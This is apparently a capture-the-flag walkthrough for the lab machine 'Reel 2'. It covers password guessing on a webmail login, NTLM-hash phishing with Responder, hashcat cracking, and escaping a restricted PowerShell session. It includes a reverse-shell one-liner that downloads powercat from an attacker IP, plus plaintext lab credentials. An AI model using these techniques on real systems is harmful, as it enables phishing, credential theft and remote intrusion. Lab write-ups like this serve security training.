# REEL 2

## Enumeration

port 443 is accesible
```
/public
```

on port 8080
```
sven - summer is too hot this year 2020
username: svensson

```

Valid username
```
S.svensson
which have summer in its password
```
try to login to https://ip/owa/auth

```
S.svensson: Summer2020
```

After login we see there are 10-12 emails in the address book.
Let's go to fishing.
select all and send a email..

phishing will be done with NTLM hash stealing with responder
https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes

Download Responder and send your ip address to the users.

**bug: the user is nowhere: use k.svensson to send the email with your ip**

crack the hash with hashcat
```bash
hashcat -m 5600 hash wordlist

```

```creds
k.svensson: kittycat1
```

**Evil-winrm will not work**

Run powershell in kali and enter following commands

```bash
sudo apt-get install powershell
sudo apt-get install gss-ntlmssp

pwsh
$session = New-PSSession -Computer 10.10.10.210  -Authentication Negotiate -Credential k.svensson 

Enter-PSSession $session

```


### Escaping powershell

> Get-Command ( it list all the available commands )
> so we are going to define a function whose name will be on of the available commands.


```bash
function Get-Help { whoami }   # defining the function

Get-Help 	# calling it 
```

Getting reverse shell

```bash
function Get-Help { powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.107:8000/powercat.ps1');powercat -c 10.10.14.107 -p 1234 -e cmd" }
```






## Root

in the \Users\Documents there is a sticky notes link it means there is some sticky notes on the desktop.

checking the 
C:\Users\k.svensson\AppData\Roaming\stickynotes\000003.log



```
jea_test_account: Ab!Q@vcg^%@#1
```

to login we need to convert this password into secure string and then pass to New-pssesion
https://duffney.io/addcredentialstopowershellfunctions/

```
$password = ConvertTo-SecureString "Ab!Q@vcg^%@#1" -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential ("jea_test_account", $password)

Enter-PSSession -Computer 10.10.10.210 -Credential $Cred -ConfigurationName jea_test_account -Authentication Negotiate
```
### just enough administration
Now in the documents there were two files .. reading those 
there is function of check-file which is available to jea_test_account after login ( Get-Commands)

In file jea_test_account.psrc
```bash
FunctionDefinitions = @{
    'Name' = 'Check-File'
    'ScriptBlock' = {param($Path,$ComputerName=$env:COMPUTERNAME) [bool]$Check=$Path -like "D:\*" -or $Path -like "C:\ProgramData\*" ; if($check) {get-content $Path}} }
```

Thas it Rooted